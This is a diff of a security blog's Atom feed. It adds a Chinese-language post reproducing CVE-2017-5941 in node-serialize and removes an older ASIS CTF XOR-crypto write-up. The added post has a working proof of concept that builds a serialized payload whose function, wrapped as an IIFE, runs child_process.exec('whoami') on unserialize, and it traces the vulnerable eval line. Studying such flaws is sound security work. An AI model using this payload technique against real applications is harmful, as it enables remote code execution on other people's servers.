@@ -199,6 +199,55 @@
   </entry>
   
   <entry>
+    <title>Node.js中的反序列化漏洞：CVE-2017-5941</title>
+    <link href="http://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/"/>
+    <id>http://chybeta.github.io/2017/11/01/Node-js中的反序列化漏洞：CVE-2017-5941/</id>
+    <published>2017-11-01T10:14:53.000Z</published>
+    <updated>2017-11-01T12:08:21.859Z</updated>
+    
+    <content type="html"><![CDATA[<p>合上吧，水文一篇。<br>Node.js中的反序列化漏洞<br><a id="more"></a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>安装好node和npm后，安装一下主角node-serialize<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install node-serialize@0.0.4 --save</div></pre></td></tr></table></figure></p>
+<p>测试代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> chybeta = &#123;</div><div class="line">	<span class="attr">vuln</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'whoami'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) </span>&#123;<span class="built_in">console</span>.log(stdout);&#125;);&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">serResult = serialize.serialize(chybeta);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"serialize result:"</span>);</div><div class="line"><span class="built_in">console</span>.log(serResult+<span class="string">'\n'</span>);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Direct unserialize:"</span>)</div><div class="line">serialize.unserialize(serResult);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"\n"</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Use IIFE to PWN it:"</span>)</div><div class="line">exp = serResult.substr(<span class="number">0</span>,serResult.length<span class="number">-2</span>) + <span class="string">"()"</span> + serResult.substr(<span class="number">-2</span>);</div><div class="line"><span class="built_in">console</span>.log(exp);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Exec whoami:"</span>)</div><div class="line">serialize.unserialize(exp);</div></pre></td></tr></table></figure></p>
+<p>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node index.js</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/5.png?raw=true" alt=""><br>可以看到执行了命令whoami</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="关于IIFE"><a href="#关于IIFE" class="headerlink" title="关于IIFE"></a>关于IIFE</h2><p>从运行截图来看，直接对序列化串进行反序列化，并不能导致远程命令执行，而是需要对序列化串进行修改。这里需要用到JS的IIFE(Immediately-Invoked Function Expression)，也即立即执行函数。这里简单的进行介绍。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/6.png?raw=true" alt=""></p>
+<p>前两种写法都是很正常的函数调用。</p>
+<p>而第三种<code>function(){console.log(&quot;Hello,chybeta three!&quot;)}();</code>，由于它直接以<code>function()</code>开头，js解释器默认情况下碰到function关键字时将其当作函数声明，而第三种写法缺少函数声明所必需的函数名。若要执行该函数，则必须显式地指定其为函数表达式。</p>
+<p>第四种写法<code>(function(){console.log(&quot;Hello,chybeta four!&quot;)}());</code>，则是常见的IIFE写法，js解释器在遇到<code>()</code>时，将其中的内容解释为函数表达式，而不是函数声明，因此得以执行。注意在<code>Hello,chybeta four!&quot;)}</code>的后面还有一对括号<code>()</code></p>
+<h2 id="node-serialize"><a href="#node-serialize" class="headerlink" title="node-serialize"></a>node-serialize</h2><p>在node-serialize的源码中，即node-serialize/lib/serialize.js，第59行开始，是对反序列(unserialize)的处理：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">exports.unserialize = <span class="function"><span class="keyword">function</span>(<span class="params">obj, originObj</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> isIndex;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">'string'</span>) &#123;</div><div class="line">    obj = <span class="built_in">JSON</span>.parse(obj);</div><div class="line">    isIndex = <span class="literal">true</span>;</div><div class="line">  &#125;</div><div class="line">  originObj = originObj || obj;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> circularTasks = [];</div><div class="line">  <span class="keyword">var</span> key;</div><div class="line">  <span class="keyword">for</span>(key <span class="keyword">in</span> obj) &#123;</div><div class="line">    <span class="keyword">if</span>(obj.hasOwnProperty(key)) &#123;</div><div class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'object'</span>) &#123;</div><div class="line">        obj[key] = exports.unserialize(obj[key], originObj);</div><div class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'string'</span>) &#123;</div><div class="line">        <span class="keyword">if</span>(obj[key].indexOf(FUNCFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = <span class="built_in">eval</span>(<span class="string">'('</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">')'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(obj[key].indexOf(CIRCULARFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = obj[key].substring(CIRCULARFLAG.length);</div><div class="line">          circularTasks.push(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">   .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>其中有一句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;);</div></pre></td></tr></table></figure></p>
+<p>不妨在该句之前加上console.log：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">console.log(obj[key].substring(FUNCFLAG.length));</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/7.png?raw=true" alt=""></p>
+<p>执行<code>node index.js</code>，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/8.png?raw=true" alt=""></p>
+<p>所以在进行eval时，实际进行的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval((function ()&#123;require(&apos;child_process&apos;).exec(&apos;whoami&apos;, function(error, stdout, stderr) &#123;console.log(stdout);&#125;);&#125;()));</div></pre></td></tr></table></figure></p>
+<p>后面的这对括号<code>()</code>，正是我们在修改原反序列化串时加上的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exp = serResult.substr(0,serResult.length-2) + &quot;()&quot; + serResult.substr(-2);</div></pre></td></tr></table></figure></p>
+<p>eval执行了该语句，从而造成了命令执行。</p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="https://paper.seebug.org/213/" target="_blank" rel="external">利用 Node.js 反序列化漏洞远程执行代码</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;合上吧，水文一篇。&lt;br&gt;Node.js中的反序列化漏洞&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
+    
+      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+    
+      <category term="Node.js" scheme="http://chybeta.github.io/tags/Node-js/"/>
+    
+      <category term="反序列化" scheme="http://chybeta.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
     <title>2017年百越杯AWD-web-writeup</title>
     <link href="http://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/"/>
     <id>http://chybeta.github.io/2017/10/28/2017年百越杯AWD-web-writeup/</id>
@@ -1445,51 +1494,6 @@
       <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
     
       <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ASISCTF2017-Simple Crypto-writeup</title>
-    <link href="http://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/"/>
-    <id>http://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/</id>
-    <published>2017-09-11T23:34:41.000Z</published>
-    <updated>2017-09-12T10:29:02.562Z</updated>
-    
-    <content type="html"><![CDATA[<p>ASISCTF2017-Simple Crypto-writeup<br>简单异或加密<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Begining always needs an interesting challenge, we can assure you, this challenge is an interesting one to begin the CTF!</div><div class="line">Challange Updated, please redownload the binary file!</div><div class="line"></div><div class="line">https://asisctf.com/tasks/simple_crypto_e5189fe3d3d64de3d612de266315a9e96dc43787</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>下载下来后解压得到两个文件flag.enc和simple.py。flag.enc是加密后的文件，simple.py是加密算法的实现，其代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</div><div class="line"></div><div class="line">KEY = <span class="string">'musZTXmxV58UdwiKt8Tp'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line">flag, key = FLAG.encode(<span class="string">'hex'</span>), KEY.encode(<span class="string">'hex'</span>)</div><div class="line">enc = xor_str(key * (len(flag) // len(key) + <span class="number">1</span>), flag).encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.enc'</span>, <span class="string">'w'</span>)</div><div class="line">ef.write(enc.decode(<span class="string">'hex'</span>))</div><div class="line">ef.close()</div></pre></td></tr></table></figure></p>
-<p>流程如下；</p>
-<ol>
-<li>将FLAG,KEY进行hex编码得到flag，key</li>
-<li>经过xor_str()处理，将flag，key的每一位对应进行异或操作，返回最后的结果后进行一次hex编码，得到enc</li>
-<li>将enc进行hex解码后写入到文件flag.enc中</li>
-</ol>
-<p>由于只是进行简单的异或操作，所以解密系统可以归纳如下：</p>
-<ol>
-<li>从flag.enc中读取，并进行hex编码，得到enc</li>
-<li>把KEY进行hex编码，得到key</li>
-<li>将key和enc进行xor_str()处理，并进行一次hex编码，得到flag</li>
-<li>将flag进行hex解码，得到FLAG</li>
-</ol>
-<p>据此写出解密脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.enc'</span>, <span class="string">'rb'</span>)</div><div class="line">flag = ef.read()</div><div class="line"></div><div class="line">KEY = <span class="string">'musZTXmxV58UdwiKt8Tp'</span></div><div class="line">key = KEY.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">dec = xor_str(key * (len(flag) // len(key) + <span class="number">1</span>), flag).encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">df = open(<span class="string">"decflag"</span>,<span class="string">'wb'</span>)</div><div class="line">df.write(dec.decode(<span class="string">'hex'</span>))</div><div class="line">df.close()</div></pre></td></tr></table></figure></p>
-<p>得到的decflag里的一长串字符用hex编辑器处理一下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/1.png?raw=true" alt=""></p>
-<p>得到flag：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/2.png?raw=true" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;ASISCTF2017-Simple Crypto-writeup&lt;br&gt;简单异或加密&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Crypto" scheme="http://chybeta.github.io/categories/writeup-Crypto/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="crypto" scheme="http://chybeta.github.io/tags/crypto/"/>
     
   </entry>
   
